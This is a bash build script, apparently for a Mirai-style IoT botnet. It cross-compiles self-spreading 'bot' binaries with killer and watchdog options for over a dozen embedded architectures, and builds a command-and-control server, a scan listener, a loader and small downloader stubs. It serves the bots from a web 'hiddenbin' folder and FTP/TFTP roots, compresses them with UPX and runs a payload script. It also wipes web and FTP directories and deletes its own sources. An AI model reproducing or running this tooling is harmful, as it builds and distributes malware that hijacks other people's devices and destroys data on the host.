#!/bin/bash
echo " [Space] > Export bin"
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

echo " [Space] > Export GOLANG - mysql / shellwords"
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

# Compile Setting
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

function arc_compile {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

echo " [Space] > REMOVE - release / html / tftpboot / ftp"
rm -rf ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

echo " [Space] > CREATE - release / html / tftpboot / ftp / hiddenbin"
mkdir ~/release
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/hiddenbin

echo " [Space] > Building - [ cnc > loader ]"
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/

echo " [Space] > Building - [ scanListen ]"
go build -o loader/scanListen scanListen.go

echo " [Space] > Building - arc"
arc_compile arc arc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - x86"
compile_bot i586 x86 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - x86_64"
compile_bot x86_64 x86_64 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - i686"
compile_bot i686 i686 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - mips"
compile_bot mips mips "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - mipsel"
compile_bot mipsel mipsel "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - armv4l"
compile_bot armv4l arm "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - armv5l"
compile_bot armv5l arm5 "-DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - armv6l"
compile_bot armv6l arm6 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - armv7l"
compile_bot_arm7 armv7l arm7 "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - powerpc"
compile_bot powerpc ppc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - sparc"
compile_bot sparc sparc "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - m68k"
compile_bot m68k m68k "-static -DKILLER -DSELFREP -DWATCHDOG"
echo " [Space] > Building - sh4"
compile_bot sh4 sh4 "-static -DKILLER -DSELFREP -DWATCHDOG"

echo " [Space] > COPY FILE - release/* > /var/www/html/hiddenbin"
cp release/* /var/www/html/hiddenbin
echo " [Space] > COPY FILE - release/* > /var/ftp"
cp release/* /var/ftp
echo " [Space] > COPY FILE - release/* > /var/lib/tftpboot"
cp release/* /var/lib/tftpboot
mv api.php /var/www/html

echo " [Space] > Building loader"
gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

echo " [Space] > REBOOT [ ARC ]"
x86_64-gcc -Os -D BOT_ARCH=\"x86\" -D x86_64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86_64
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mipsel\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mipsel
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"sparc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sparc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mipsel
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sparc

echo -e "\e[01;36m CP - release | RM - Inactive files \e[0m"
cp ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/selfrep/src ~/bot ~/scanListen.go ~/Projects ~/build.sh
echo " [Space] > REMOVE - release"
rm -rf release

apt install apache2 -y &> /dev/null
service apache2 start &> /dev/null
apt install xinetd tftpd-hpa -y &> /dev/null
apt install vsftpd -y &> /dev/null
service vsftpd start &> /dev/null

echo -e "\e[01;36m BUILD - upx / ultra-brute \e[0m"
wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/hiddenbin/*
./upx --ultra-brute /var/lib/tftpboot/*
./upx --ultra-brute /var/ftp/*
rm -rf upx*
python3 payload.py
rm -rf payload.py